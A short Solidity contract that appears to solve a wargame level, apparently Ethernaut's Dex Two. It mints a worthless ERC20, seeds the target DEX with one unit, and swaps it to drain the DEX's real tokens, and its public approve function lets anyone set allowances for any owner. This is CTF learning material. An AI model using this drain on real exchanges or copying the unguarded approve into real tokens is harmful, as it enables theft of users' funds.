//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../ERC20/IERC20.sol";
import "../ERC20/ERC20.sol";

contract Approve is ERC20 {
    address dex2Contract = 0xb00BFE426B5bc16408f8C9744F2419ca3DC032B4;

    //The contract has no check for allowed ERC20s
    //So we mint our own ERC20 with some supply to player address and 1 to the Dex2 contract address.
    //According to the ratio swap amount for 1 myToken is balanceOfToken(token1)/balanceOfToken(myToken) = 100
    //After swapping 1 myToken contract now has 2 myTokens so we swap 2 myTokens for 100 token2's next.

    constructor(
        address dexInstance,
        string memory name,
        string memory symbol,
        uint256 initialSupply
    ) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _mint(dex2Contract, 1);
    }

    function approve(
        address owner,
        address spender,
        uint256 amount
    ) public {
        super._approve(owner, spender, amount);
    }
}
